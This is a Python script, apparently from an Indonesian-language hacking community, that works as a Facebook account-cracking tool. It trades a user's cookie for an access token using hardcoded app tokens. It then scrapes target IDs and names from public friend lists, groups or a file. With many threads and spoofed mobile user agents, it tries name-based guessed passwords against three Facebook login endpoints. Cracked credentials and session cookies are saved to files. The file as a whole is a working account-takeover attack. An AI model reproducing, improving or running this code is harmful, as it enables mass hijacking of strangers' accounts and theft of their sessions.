
# Source By   : Fajar Khafi (Kato Kyta)                  
# This script is free, don't sell it!               

import re, requests, random, json, sys, time, datetime, os, uuid, base64, string,subprocess,calendar
from concurrent.futures import ThreadPoolExecutor as Thread
from time import time as FajarTime
from bs4 import BeautifulSoup as parser
from bs4 import BeautifulSoup as beautifulsoup
from datetime import date,datetime
from string import *

#rich
from rich.progress import Progress,SpinnerColumn,BarColumn,TextColumn,TimeElapsedColumn
from rich import print as prints
from rich.tree import Tree
from rich.panel import Panel
ses = requests.Session()

P = '\x1b[1;97m'
M = '\x1b[1;91m'
H = '\x1b[1;92m'
K = '\x1b[1;93m'
B = '\x1b[1;94m'
U = '\x1b[1;95m'
O = '\x1b[1;96m'
N = '\x1b[0m'
Z = "\033[1;30m"
J = "\x1b[38;5;208m" # Jingga
A = '\x1b[1;90m' # WARNA ABU ABU

Z2 = "[#000000]" # HITAM
M2 = "[#FF0000]" # MERAH
H2 = "[#00FF00]" # HIJAU
K2 = "[#FFFF00]" # KUNING
B2 = "[#00C8FF]" # BIRU
U2 = "[#AF00FF]" # UNGU
N2 = "[#FF00FF]" # PINK
O2 = "[#00FFFF]" # BIRU MUDA
P2 = "[#FFFFFF]" # PUTIH
J2 = "[#FF8F00]" # JINGGA
A2 = "[#AAAAAA]" # ABU-ABU

#global
id1,id2,loop,ok,cp = [],[],0,0,0
agen,agen2 = [],[]
metode, pwpluss, pwnya,  tokenku = [], [], [], []
rr = random.randint
rc = random.choice
sys.stdout.write(f'\x1b]2; ( Kyta FB )\x07')

#--- > time 
sasi = ["Jan", "Feb", "Mar", "Apr", "Mei", "Jun", "Jul", "Agu", "Sep", "Okt", "Nov", "Des"]
tete = {"01": "Jan", "02": "Feb", "03": "Mar", "04": "Apr", "05": "Mai", "06": "Jun", "07": "Jul", "08": "Agu", "09": "Sep", "10": "Okt", "11": "Nov", "12": "Des"}
now = datetime.now()
hari = now.day
blx = now.month
try:
	if blx < 0 or blx > 12:exit()
	xx = blx - 1
except ValueError:exit()
#if hp not in out:exit()
bulan = sasi[xx]
tahun = now.year
tanggal = str(hari)+'-'+str(bulan)+'-'+str(tahun)
ress_ok = f'OK-{hari}-{bulan}-{tahun}.txt'
ress_cp = f'CP-{hari}-{bulan}-{tahun}.txt'


class MainTermux(object):
      def __init__(self, **ingfo):
          try:ingfo.update({'Author': sys.argv[1]})
          except:exit(' [!] Gagal Masuk Ke Menu Jalankan Ulang Dengan Perintah Di Bawah Ini\nRun: python {} Katoky'.format(sys.argv[0]))
          if ingfo.get('Author') == ('Katoky') or ingfo.get('Author').lower() == ('Katoky'):
             xxxx = os.getcwd()
             if os.path.isfile('.token.txt') is True:
                if os.path.isfile('.cok.txt') is True:
                	menu()
             else:
                 try:
                     subrek = open("data/foll.fb","r").read()
                 except:
                     open("data/foll.fb","w").write("sudah follow")
                     os.system("xdg-open https://www.facebook.com/fajar.xzyra")
             Cookies()
          else:
             exit('Utamakan Baca Dulu Di Github Aku\nRun: python {} Katorky'.format(sys.argv[0]))

def Cookies():
	try:
		os.system("clear")
		print('%s___________ ________.    %s__%s'%(P,M,P))
		print('%s\_   _____// ____\_ |__ %s|  | ____ __%s'%(P,M,P)) 
		print('%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s'%(P,M,P))
		print('%s |        \|  |   | \_\ \%s    <|  |  /%s'%(P,M,P))
		print('%s/_______  /|__|   |___  /%s__|_ \____/%s'%(P,M,P)) 
		print('%s        \/            \/ %s    \/%s'%(P,M,P))
		prints(f' [!] [underline]{H2}source by Kato Kyta{P2}') # jangan di ganti ya ajg
		print("\n [!] Informasi : Harap gunakan akun tumbal")
		cok = input(f' [!] masukan cookie : ')
		cos = {'cookie':cok}; data = {'access_token': '1348564698517390|007c0a9101b9e1c8ffab727666805038', 'scope': ''}; req  = ses.post('https://graph.facebook.com/v16.0/device/login/',data=data).json(); cd   = req['code']; ucd  = req['user_code']; url  = 'https://graph.facebook.com/v16.0/device/login_status?method=post&code=%s&access_token=1348564698517390|007c0a9101b9e1c8ffab727666805038'%(cd); req  = parser(ses.get('https://mbasic.facebook.com/device',cookies=cos).content,'html.parser'); raq  = req.find('form',{'method':'post'}); dat  = {'jazoest' : re.search('name="jazoest" type="hidden" value="(.*?)"',str(raq)).group(1), 'fb_dtsg' : re.search('name="fb_dtsg" type="hidden" value="(.*?)"',str(req)).group(1), 'qr' : '0', 'user_code' : ucd}; rel  = 'https://mbasic.facebook.com' + raq['action']; pos  = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser')
		dat  = {}
		raq  = pos.find('form',{'method':'post'})
		for x in raq('input',{'value':True}):
			try:
				if x['name'] == '__CANCEL__':
					pass
				else:
					dat.update({x['name']:x['value']})
			except Exception as e:
				pass
		rel = 'https://mbasic.facebook.com' + raq['action']; pos = parser(ses.post(rel,data=dat,cookies=cos).content,'html.parser'); req = ses.get(url,cookies=cos).json(); tok = req['access_token']; kot = open('.token.txt','w').write(tok); koc = open('.cok.txt','w').write(cok); print(f'{P} [!] Login Sukses')
		print('\n [!] Your Token : {}'.format(req['access_token']));exit()
	except Exception as e:
		print(f'{M}{str(e)}');exit()

	
def menu_ku():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except IOError:exit("cookie non aktive");time.sleep(1);Cookies()
	try:
		link = requests.Session().get('https://graph.facebook.com/me?fields=id,name&access_token=%s'%(token),cookies={'cookie':cok})
		nami = json.loads(link.text)['name']
		user = json.loads(link.text)['id']
	except KeyError:Cookies()
	except requests.exceptions.ConnectionError:exit(' [!] Tidak ada koneksi.')
	os.system("clear")
	print('%s___________ ________.    %s__%s'%(P,M,P))
	print('%s\_   _____// ____\_ |__ %s|  | ____ __%s'%(P,M,P)) 
	print('%s |    __)_\   __\ | __ \%s|  |/ /  |  \%s'%(P,M,P))
	print('%s |        \|  |   | \_\ \%s    <|  |  /%s'%(P,M,P))
	print('%s/_______  /|__|   |___  /%s__|_ \____/%s'%(P,M,P)) 
	print('%s        \/            \/ %s    \/%s'%(P,M,P))
	prints(f' [!] [underline]{H2}source by Kato Kyta{P2}') # jangan di ganti ya ajg
	print('\n %s[!] username : %s%s%s'%(P,H,nami,P))
	print(' %s[!] user uid : %s%s%s'%(P,H,user,P))
	print()
	print(' %s(01). crack %sin%s random %spublik%s'%(P,M,P,H,P))
	print(' %s(02). crack %sin%s random %sgroup%s'%(P,M,P,H,P))
	print(' %s(03). crack %sin%s random %sfile%s'%(P,M,P,H,P))
	print(' %s(04). Logout%s Delete cookie %s'%(P,M,P))
def crack_file():
	print()
	file = input(f' [!] file name : ')
	try:
		uuid = open(file,'r').readlines()
		for data in uuid:
			try:user,nama = data.split('|')
			except:exit(f" [!] pemisah salah")
			id1.append(data)
			print('\r [!] sedang dump %s id'%(len(id1)),end=" ")
			time.sleep(0.0000003)
	except FileNotFoundError:exit(f" [|] file tidak ada")
	print()
	Setting()
	
def grup(url):
	try:
		link=parser(ses.get(url).text,'html.parser')
		for uid in re.findall('data-sigil="feed_story_(.*?)class="img',str(link)):
			for user in re.findall('ring(.*?)"',str(uid)):
				for nama in re.findall('label="(.*?),',str(uid)):
					if user+'|'+nama in id1:pass
					else:id1.append(user+'|'+nama)
					print(' [!] CTL + C untuk berhenti dump ')
					print(f" [!] {M}{len(id1)}{P}      ", end='\r');time.sleep(0.0000100)
		for x in link.find_all('a',href=True):
			if x.text == 'Lihat Postingan Lainnya…':
				grup('https://iphone.facebook.com'+x.get('href'))
	except:pass

def Publik():
	try:
		token = open('.token.txt','r').read()
		cok = open('.cok.txt','r').read()
	except Exception as e:print(f" {str(e).title()})");time.sleep(5);Cookies()
	except requests.exceptions.ConnectionError:exit(' [!] Tidak ada koneksi.')
	print()
	print('%s [!] pastikan %suid%s bersifat publik%s'%(P,H,P,P))
	user2 = input(' [!] uid: ')
	for uid in user2.split(','):
		try:
			date = ses.get(f'https://graph.facebook.com/v14.0/{uid}?fields=name,friends.limit(5000)&access_token={token}',cookies = {'cookies':cok}).json()
			search = date["name"]
			for x in date["friends"]["data"]:
				try:
					id1.append(x["username"]+"|"+x["name"])
				except:
					id1.append(x["id"]+"|"+x["name"])
					print(f" [!] {H}{str(search)}|{M}{len(id1)}{P}      ", end='\r')
		except (KeyError,IOError):
			print(f' [!] id {uid} private',end='\r');time.sleep(0.0003)
	try:
		print(f"\r [!] Total Dump %s User"%(str(len(id1))))
		Setting()
	except requests.exceptions.ConnectionError: 
		print(" [!] koneksi internet anda buruk")
		
def menu_mtd():
	print()
	if len(id1)==0:
		exit('uid tidak publik')
	
	muda=[]
	for bacot in sorted(id1):
		muda.append(bacot)
	bcm=len(muda)
	bcmi=(bcm-1)
	for xmud in range(bcm):
		id2.append(muda[bcmi])
		bcmi -=1

	print(' %s(01). https://m.facebook .com %sregular%s'%(P,H,P))
	print(' %s(02). https://m.alpha.facebook.com %sascny%s'%(P,H,P))
	print(' %s(03). https://graph.facebook.com %sgraph%s'%(P,H,P))
	
def hasil():
	print("%s [!] %sResults OK Tersimpan Di : %s%s"%(P,H,ress_ok,P))
	print("%s [!] %sResults CP Tersimpan Di : %s%s\n"%(P,K,ress_cp,P))
	
def take_password():
	global prog,des
	print()
	hasil()
	prog = Progress(TextColumn('{task.description}'),TextColumn('{task.percentage:.0f}%'))
	des = prog.add_task('',total=len(id2))
	with prog:
		with Thread(max_workers=30) as fajar_ganteng:
			for user in id2:
				uix, nama = user.split("|")[0], user.split("|")[1].lower()
				depan = nama.split(" ")[0]
				if len(nama) <=5:
					if len(depan) <=1 or len(depan) <=2:pass
					else:
						pwid = [
							depan+"123",
							depan+"1234",
							depan+"12345",
							depan+"01",
							depan+"02",
							depan+"03",
							depan+"04",
							depan+"05",
							nama.lower()
						]
				else:
					pwid = [
						nama,
						nama.lower(),
						depan+"123",
						depan+"1234",
						depan+"12345",
						depan+"123456",
						depan,
						depan.lower()
					]
				if 'ya' in pwpluss:
					for xpwd in pwnya:
						pwid.append(xpwd)
				else:pass
				if 'id_1' in metode:fajar_ganteng.submit(crack1,uix,pwid)
				elif 'id_2' in metode:fajar_ganteng.submit(crack2,uix,pwid)
				elif 'id_3' in metode:fajar_ganteng.submit(crack3,uix,pwid)
				else:fajar_ganteng.submit(crack1,id2,uix,pwid)
		exit("\n\ncracking done!")

	
def crack1(uix,pwid):
	global loop,ok,cp
	prog.update(des,description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})")
	prog.advance(des)
	for pw in pwid:
		try:
			ua2 = random.choice(agen2)
			ses = requests.Session()
			link = ses.get("https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr")
			data = {'lsd':re.search('name="lsd" value="(.*?)"',str(link.text)).group(1),'jazoest':re.search('name="jazoest" value="(.*?)"',str(link.text)).group(1),'m_ts':re.search('"m_ts" value="(.*?)"',str(link.text)).group(1),'li':re.search('"li" value="(.*?)"',str(link.text)).group(1),'try_number': '0','unrecognized_tries': '0','email':uix,'pass':pw,'login': 'Masuk','bi_xrwh':re.search('"bi_xrwh" value="(.*?)"',str(link.text)).group(1)}
			params = {'refsrc': 'deprecated','lwv': '100'}
			headers = {'authority': 'mbasic.facebook.com','accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7','accept-language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7','cache-control': 'max-age=0','origin': 'https://mbasic.facebook.com','referer': 'https://mbasic.facebook.com/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&refsrc=deprecated&_rdr','sec-ch-prefers-color-scheme': 'light','sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"','sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"','sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Android"','sec-ch-ua-platform-version': '"9.0.0"','sec-fetch-dest': 'document','sec-fetch-mode': 'navigate','sec-fetch-site': 'same-origin','sec-fetch-user': '?1','upgrade-insecure-requests': '1','user-agent': ua2,'viewport-width': '980'}
			response = ses.post('https://mbasic.facebook.com/login/device-based/regular/login/?next=https%3A%2F%2Fdevelopers.facebook.com%2Fdocs%2Ffacebook-login%2Fweb%2Flogin-button%3Flocale%3Did_ID&',params=params,headers=headers, data=data,allow_redirects=False)
			if "c_user" in ses.cookies.get_dict():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}/{P}] {H}{uix}|{pw}{P}')
				print(f'  {H}locale=id_ID;{kuki}{P}')
				open('OK/'+ress_ok,'a').write(uix+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in response.cookies.get_dict():
				print(f' {P}[{K}/{P}] {K}{uix}|{pw}{P}')
				cp+=1
				open('CP/'+ress_cp,'a').write(uix+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

def crack2(uix,pwid):
	global loop,ok,cp
	prog.update(des,description=f" [!] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})")
	prog.advance(des)
	for pw in pwid:
		try:
			ua2 = random.choice(agen2)
			ses = requests.Session()
			Head1 = ({"connection": "keep-alive", "accept-language": "id,en-US;q=0.9,en;q=0.8", "sec-fetch-mode": "navigate", "accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9", "sec-fetch-sest": "document", "sec-fetch-site": "none", "cache-control": "max-age=0", "sec-fetch-user": "?1", "upgrade-insecure-requests": "1", "host": "m.alpha.facebook.com", "user-agent": ua2})
			ress = ses.get('https://m.alpha.facebook.com/login.php?',headers = Head1).text
			Data = {
				'm_ts': re.search('name="m_ts" value="(.*?)"', str(ress)).group(1),
				'li': re.search('name="li" value="(.*?)"', str(ress)).group(1),
				'try_number': 0,
				'unrecognized_tries': 0,
				'email': uix,
				'prefill_contact_point': uix,
				'prefill_source': 'browser_dropdown',
				'prefill_type': 'password',
				'first_prefill_source': 'browser_dropdown',
				'first_prefill_type': 'contact_point',
				'had_cp_prefilled': True,
				'had_password_prefilled': True,
				'is_smart_lock': False,
				'bi_xrwh': 0,
				'encpass': f"#PWD_BROWSER:0:{str(FajarTime()).split('.')[0]}:{pw}",
				'fb_dtsg': re.search('{"dtsg":{"token":"(.*?)"', str(ress)).group(1),
				'jazoest': re.search('name="jazoest" value="(\d+)"', str(ress)).group(1),
				'lsd': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'__dyn': '',
				'__csr': '',
				'__req': random.choice(['1','2','3','4','5']),
				'__a': re.search('"encrypted":"(.*?)"', str(ress)).group(1),
				'__user': 0
			}
			Head = {
				'Connection': 'keep-alive',
				'Accept': '*/*',
				'Accept-Language': 'id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7',
				'sec-ch-ua-mobile': '?1',
				'Origin': 'https://m.alpha.facebook.com',
				'X-FB-LSD': re.search('name="lsd" value="(.*?)"', str(ress)).group(1),
				'X-ASBD-ID': '129477',
				'Content-Type': 'application/x-www-form-urlencoded',
				'Content-Length': str(len((Data))),
				'sec-ch-ua-platform': '"Android"',
				'Sec-Fetch-Site': 'same-origin',
				'Referer': 'https://m.alpha.facebook.com/login.php?',
				'Host': 'm.alpha.facebook.com',
				'Sec-Fetch-Mode': 'cors',
				'Sec-Fetch-Dest': 'empty',
				'User-Agent':ua2,
				'sec-ch-ua': '"Not/A)Brand";v="99", "Google Chrome";v="{}", "Chromium";v="{}"'.format(re.search('Chrome/(\d+).', str(ua2)).group(1), re.search('Chrome/(\d+).', str(ua2)).group(1)),
				'Accept-Encoding': 'gzip, deflate, br',
				'viewport-width': '424'
			}
			ress2 = ses.post('https://m.alpha.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100', headers = Head, data = Data, allow_redirects = False)
			if "c_user" in ses.cookies.get_dict().keys():
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f' {P}[{H}/{P}] {H}{uix}|{pw}{P}')
				print(f'  {H}locale=id_ID;{kuki}{P}')
				open('OK/'+ress_ok,'a').write(uix+'|'+pw+'|'+kuki+'\n')
				ok+=1
				break
			elif "checkpoint" in ses.cookies.get_dict().keys():
				print(f' {P}[{K}/{P}] {K}{uix}|{pw}{P}')
				cp+=1
				open('CP/'+ress_cp,'a').write(uix+'|'+pw+'\n')
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1


def xxxc():
	device = random.choice(['RMX1831',''])
	denin = random.choice(["{density=2.25,height=1092,width=2082};]","{density=2.0,height=850,width=750};]","{density=3.0,height=1082,width=1092};]","{density=2.25,height=2093,width=1093};]",'{density=3.0,height=1995,width=1836};]', '{density=3.0,height=1483,width=1829};]', '{density=2.25,height=1577,width=2027};]', '{density=2.0,height=1073,width=1016};]', '{density=2.0,height=1278,width=1286};]', '{density=3.0,height=1885,width=1099};]', '{density=2.0,height=1086,width=1798};]', '{density=2.0,height=2027,width=1725};]', '{density=2.25,height=1405,width=1829};]', '{density=2.0,height=1473,width=1806};]', '{density=3.0,height=1637,width=1294};]', '{density=2.0,height=1851,width=1173};]', '{density=2.25,height=1373,width=1416};]', '{density=2.25,height=1446,width=1251};]', '{density=3.0,height=1883,width=1093};]', '{density=2.25,height=1059,width=1542};]', '{density=2.0,height=1151,width=1273};]', '{density=3.0,height=1620,width=1840};]', '{density=3.0,height=1717,width=1745};]', '{density=2.25,height=1161,width=1541};]', '{density=2.0,height=1060,width=1132};]', '{density=2.25,height=1282,width=2024};]', '{density=2.25,height=1191,width=1221};]', '{density=2.25,height=1349,width=1788};]', '{density=2.0,height=1608,width=1794};]', '{density=2.0,height=1495,width=1906};]',])
	uai  = f"Davik/2.1.0 (Linux; U; Android {str(rr(4,13))}; RMX1941 Build/PPR1.180610.011) [FBAN/MessengerLite;FBAV/{str(rr(40,360))}.325.0.0.5.56;FBPN/com.facebook.mlite;FBLC/en_GB;FBBV/919886436;FBCR/XL Axiata;FBMF/Realme;FBBD/Realme;FBDV/RMX1941;FBSV/{str(rr(4,13))};FBCA/arm64-v8a:armeabi-v7a:armeabi;FBDM/"+f"{denin};"
	return uai
	
def crack3(uix,pwid):
	global loop,ok,cp
	prog.update(des,description=f" [{M2}/{P2}] {P2}{len(id2)} {H2}Live {P2}:-{H2}{(ok)} {K2}Check {P2}:-{K2}{(cp)} {P2}({H2}{str(uix)}-{P2} : {(loop)}{P2})")
	prog.advance(des)
	for pw in pwid:
		try:
			pw = pw.lower()
			ua3 = xxxc()
			r = requests.Session()
			head = {'Host':'graph.facebook.com','x-fb-connection-bandwidth': repr(random.randint(2e7, 3e7)), 'x-fb-sim-hni': repr(random.randint(2e4, 4e4)), 'x-fb-net-hni': repr(random.randint(2e4, 4e4)),'x-fb-connection-quality': 'EXCELLENT','user-agent': ua3,'content-type': 'application/x-www-form-urlencoded', 'x-fb-http-engine': 'Liger'}
			date = {'access_token': '200424423651082|2a9918c6bcd75b94cefcbb5635c6ad16',  'format': 'JSON', 'sdk_version': {random.randrange(2, 31)}, 'email': uix, 'locale': 'id_ID', 'password': pw, 'sdk': 'android', 'generate_session_cookies': '1', 'sig': f'{random.randrange(1, 9)}f{random.randrange(100, 999)}f{random.randrange(10, 99)}fb{random.randrange(10, 99)}fcd{random.randrange(1, 9)}aa{random.randrange(0, 9)}c{random.randrange(10, 99)}f{random.randrange(10, 99)}f{random.randrange(100, 999)}ef{random.randrange(1, 9)}'}
			xnxx = r.post("https://graph.facebook.com/auth/login", params=date, headers=head, allow_redirects=False)
			if 'session_key' in xnxx.text:
				ok+=1
				q = json.loads(xnxx.text)
				coki = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"])
				sbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-")
				kuki = f"sb={sbb};{coki}"
				print(f' {P}[{H}/{P}] {H}{uix}|{pw}{P}')
				print(f'  {H}locale=id_ID;{kuki}{P}')
				open('OK/'+ress_ok,'a').write(uix+'|'+pw+'|'+kuki+'\n')
				break
			elif 'www.facebook.com' in xnxx.text:
				print(f' {P}[{K}/{P}] {K}{uix}|{pw}{P}')
				open('CP/'+ress_cp,'a').write(uix+'|'+pw+'\n')
				cp+=1
				break
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1

#kalo alot ganti aja ua nya
for z in range(1000):
    a = random.randrange(70,150)
    b = random.randrange(2000,10000)
    c = random.randrange(70,150)
    os_ver = random.randrange(6,13)                                              
    dv_typ = random.choice(['SM-S911B','SM-S908B','SM-G998B','SM-G988B','SM-G973B','SM-N986B','SM-M315F','SM-9005',' SM-G6200'])
    bl_typ = random.choice(['PPR1','LRX21T','TP1A','RKQ1','SP1A','RP1A','QQ2A','OPM1'])
    dv_typ2 = random.choice(['MCI3B','M2102K1AC','M2101K6G','2210132C','M2007J3SG','21091116UI','M2004J19C','Redmi 6A','23028RN4DG','M2004J7AC','220233L2G','22081212UG'])
    bl_typ2 = random.choice(['TKQ1','SKQ1','TP1A','RKQ1','SP1A','RP1A','OPM1','PPR1'])
    dv_typ3 = random.choice(["RMX3516", "RMX3371", "RMX3461", "RMX3286", "RMX3561", "RMX3388", "RMX3311", "RMX3142", "RMX2071", "RMX1805", "RMX1809", "RMX1801", "RMX1807", "RMX1803", "RMX1825", "RMX1821", "RMX1822", "RMX1833", "RMX1851", "RMX1853", "RMX1827", "RMX1911", "RMX1919", "RMX1927", "RMX1971", "RMX1973", "RMX2030", "RMX2032", "RMX1925", "RMX1929", "RMX2001", "RMX2061", "RMX2063", "RMX2040", "RMX2042", "RMX2002", "RMX2151", "RMX2163", "RMX2155", "RMX2170", "RMX2103", "RMX3085", "RMX3241", "RMX3081", "RMX3151", "RMX3381", "RMX3521", "RMX3474", "RMX3471", "RMX3472", "RMX3392", "RMX3393", "RMX3491", "RMX1811", "RMX2185", "RMX3231", "RMX2189", "RMX2180", "RMX2195", "RMX2101", "RMX1941", "RMX1945", "RMX3063", "RMX3061", "RMX3201", "RMX3203", "RMX3261", "RMX3263", "RMX3193", "RMX3191", "RMX3195", "RMX3197", "RMX3265", "RMX3268", "RMX3269", "RMX2027", "RMX2020", "RMX2021", "RMX3581", "RMX3501", "RMX3503", "RMX3511", "RMX3310", "RMX3312", "RMX3551", "RMX3301", "RMX3300", "RMX2202", "RMX3363", "RMX3360", "RMX3366", "RMX3361", "RMX3031", "RMX3370", "RMX3357", "RMX3560", "RMX3562", "RMX3350", "RMX2193", "RMX2161", "RMX2050", "RMX2156", "RMX3242", "RMX3171", "RMX3430", "RMX3235", "RMX3506", "RMX2117", "RMX2173", "RMX3161", "RMX2205", "RMX3462", "RMX3478", "RMX3372", "RMX3574", "RMX1831", "RMX3121", "RMX3122", "RMX3125", "RMX3043", "RMX3042", "RMX3041", "RMX3092", "RMX3093", "RMX3571", "RMX3475", "RMX2200", "RMX2201", "RMX2111", "RMX2112", "RMX1901", "RMX1903", "RMX1992", "RMX1993", "RMX1991", "RMX1931", "RMX2142", "RMX2081", "RMX2085", "RMX2083", "RMX2086", "RMX2144", "RMX2051", "RMX2025", "RMX2075", "RMX2076", "RMX2072", "RMX2052", "RMX2176", "RMX2121", "RMX3115", "RMX1921",'RMX3686'])
    bl_typ3 = random.choice(['QP1A','SKQ1','TP1A','RKQ1','SP1A','RP1A'])
    dv_typ4 = random.choice(["X676B", "X687", "X609", "X697", "X680D", "X507", "X605", "X668", "X6815B", "X624", "X655F", "X689C", "X608", "X698", "X682B", "X682C", "X688C", "X688B", "X658E", "X659B", "X689B", "X689", "X689D", "X662", "X662B", "X675", "X6812B", "X6812", "X6817B", "X6817", "X6816C", "X6816", "X6816D", "X668C", "X665B", "X665E", "X510", "X559C", "X559F", "X559", "X606", "X606C", "X606D", "X623", "X624B", "X625C", "X625D", "X625B", "X650D", "X650B", "X650", "X650C", "X655C", "X655D", "X680B", "X573", "X573B", "X622", "X693", "X695C", "X695D", "X695", "X663B", "X663", "X670", "X671", "X671B", "X672", "X6819", "X572", "X572-LTE", "X571", "X604", "X610B", "X690", "X690B", "X656", "X692", "X683", "X450", "X5010", "X501", "X401", "X626", "X626B", "X652", "X652A", "X652B", "X652C", "X660B", "X660C", "X660", "X5515", "X5515F", "X5515I", "X609B", "X5514D", "X5516B", "X5516C", "X627", "X680", "X653", "X653C", "X657", "X657B", "X657C", "X6511B", "X6511E", "X6511", "X6512", "X6823C", "X612B", "X612", "X503", "X511", "X352", "X351", "X530", "X676C", "X6821", "X6823", "X6827", "X509", "X603", "X6815", "X620B", "X620", "X687B", "X6811B", "X6810", "X6811"])
    bl_typ4 = random.choice(['TKQ1','SKQ1','TP1A','RKQ1','SP1A','RP1A','OPM1','PPR1'])
    dv_ver = random.randrange(100000,250000)                                                
    sd_ver = random.randrange(1,10)                                                        
    ch_ver = f'{a}.0.{b}.{c}'                                                
    ua = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ} Build/{bl_typ}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    ua2 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ2} Build/{bl_typ2}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    ua3 = f'Mozilla/5.0 (Linux; Android {os_ver}; {dv_typ3} Build/{bl_typ3}.{dv_ver}.00{sd_ver}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    ua4 = f'Mozilla/5.0 (Linux; U; Android {os_ver}; Infinix {dv_typ4} Build/{bl_typ4}.{str(random.randrange(150000,250000))}.001) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/{ch_ver}.{ch_ver} Mobile Safari/537.36'
    uaku1 = rc([ua, ua2, ua3, ua4])
    agen2.append(uaku1)
	
def menu():
	menu_ku()
	Fajar = input(f" [!] ᴩɪʟɪʜᴀɴ : ")
	if Fajar =="1" or Fajar =="01":
		Publik()
		
	elif Fajar =='2' or Fajar =='02':
		print()
		prints(f" [!]{H2} masukan id grup yang bersifat publik {P2}")
		user = input(" [!] mauskan id : ")
		for uid in user.split(','):
			if user == '' or user == ' ':
				print(" id tidak valid")
			else:
				grup('https://iphone.facebook.com/groups/'+uid+'/')
		Setting()
		
	elif Fajar =="3" or Fajar =="03":
		crack_file()
		
	elif Fajar =="4" or Fajar =="04":
		os.remove('.cok.txt');os.remove('.token.txt');exit(" [!] Logout berhasil")
	
	else:
		print(' [!] pilih yang bener tod');time.sleep(2);menu()
		
def Setting():
	
	menu_mtd()
	Fz = input(f' [!] ᴩɪʟɪʜᴀɴ : ')
	if Fz =='1' or Fz =='01':
		metode.append('id_1')
	elif Fz =='2' or Fz =='2':
		metode.append('id_2')
	elif Fz =='3' or Fz =='3':
		metode.append('id_3')
	else:
		metode.append('id_2')
		
	print()
	pwplus=input(' [!] tambahkan sandi manual? y/t : ')
	if pwplus in ['y','Y']:
		pwpluss.append('ya')
		pwku=input(' [!] Masukkan Password : ')
		pwkuh=pwku.split(',')
		for xpw in pwkuh:
			pwnya.append(xpw)
	else:
		pwpluss.append('no')
		print(f" [!] crack dengan sandi -> bawaan sc")
		
	take_password()
	

def AutoFolder():
    try:os.mkdir("OK")
    except:pass
    try:os.mkdir("CP")
    except:pass
    try:os.mkdir("data")
    except:pass
    
if __name__=='__main__':
  try:
      with requests.Session() as ses:
           os.system("git pull")
           AutoFolder();MainTermux()
  except requests.exceptions.ConnectionError:
      prints(f"{H2} [!]{P2} koneksi internet anda bermasalah")
      time.sleep(3);exit()
 